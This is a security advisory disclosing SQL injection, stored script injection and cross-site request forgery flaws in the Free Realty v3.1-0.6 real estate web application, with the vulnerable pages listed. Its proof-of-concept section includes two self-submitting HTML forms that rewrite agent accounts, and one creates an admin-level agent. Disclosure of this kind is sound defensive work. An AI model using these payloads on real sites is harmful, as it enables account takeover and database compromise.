Introduction:
=============
Free Realty is primarily designed for real estate agents and offices to list properties on the internet. With Free Realty the end
user does not need to be fluent in web page design. Read more in the demo site
This is a fork of
software written by Jon Roig called Open Realty. Jon has moved on to version 3.0 while a number of users have requested
continued development on the 2.x series. Other sites of note regarding 2.x development

Abstract:
=========
A Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities in the Free Reality v3.1-0.6 web application.

Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
1.1
A remote SQL Injection vulnerability is detected in the Free Reality v3.1-0.6 web application.
The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands on
the affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.

Vulnerable Module(s):
          [+] agentdisplay.php?view=
          [+] /admin/admin.php?edit=

1.2
Multiple persistent input validation vulnerabilities are detected in the Free Reality v3.1-0.6 web application.
The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) context manipulation.
Exploitation requires low user inter action.

Vulnerable Module(s):
          [+] admin/agenteditor.php - inject  notes about the Agent
          [+] agentadmin.php?edit=2 - inject title / preview description: / Long description: / notes
          [+] agentadmin.php?action=addlisting inject title / preview description: / Long description: / notes
          [+] admin/adminfeatures.php - Add new feature


1.3
A cross site request forgery vulnerability is detected in  in the Free Reality v3.1-0.6 web application. The bugs allow remote
attackers with high required user inter action to edit user accounts. Successful exploitation can lead to account access.
To exploit the issue the attacker need to create a manipulated copy the edit user mask/form. Inside of the document the
remote can implement his own values for the update because of no form or token protection. When admin get now forced to
execute the script via link he is executing the new value on the update of the application if his session is not expired.

Vulnerable Module(s):
          [+] admin/agenteditor.php?action=addagent - Add agent
          [+] admin/agenteditor.php?adminmodify=2 - Modify Agent


Proof of Concept:
=================
1.1
The sql injection vulnerability can be exploited by remote attackers without user inter action. For demonstration or reproduce ...

PoC:
http://127.0.0.1/FR/agentdisplay.php?view=1[SQL-INJECTION!]
http://127.0.0.1/FR/admin/admin.php?edit=2[SQL-INJECTION!]

1.2
The persistent input validation vulnerability can be exploited by remote attackers with medium till low required user inter action.
For demonstration or reproduce ...

Note:
The issue can be exploited by an insert on the Created Object function with script code as value.
The result is the persistent execution out of the web application context.

1.3
The csrf vulnerability can be exploited by remote attackers with high required user inter action. For demonstration or reproduce ...

<html>
<form  name="test" action="http://127.0.0.1/FR/admin/agenteditor.php?adminmodify=2" method="post">
<input type="hidden" name="agent" value="test2"><br/>
<input type="hidden" name="agenttitle" value="test3"><br/>
<input type="hidden" name="agentpass" value="storm"><br/>
</form>
<script>document.test.submit();</script>
</html>

<html>
<form  name="addagent" action="http://127.0.1.1/FR/admin/agenteditor.php?action=addagent" method="post">
<input type="hidden" name="agent" value="test3"><br/>
<input type="hidden" name="agenttitle" value="test3"><br/>
<input type="hidden" name="agentpass" value="test3"><br/>
<input type="hidden" name="agentfax" value="test3"><br/>
<input type="hidden" name="agentcell" value="test3"><br/>
<input type="hidden" name="agentphone" value="test3"><br/>
<input type="hidden" name="agenturl" value="test3"><br/>
<input type="hidden" name="agentemail=" value="test3@hotmail.com"><br/>
<input type="hidden" name="user_level" value="admin"><br/>
<input type="hidden" name="notes" value="TEST#"><br/>
</form>
<script>document.addagent.submit();</script>
</html>


Risk:
=====
1.1
The security risk of the remote SQL injection vulnerability is estimated as critical.

1.2
The security risk of the persistent input validation vulnerability is estimated as medium.

1.3
The security risk of the cross site request forgery vulnerability is estimated as low(+).
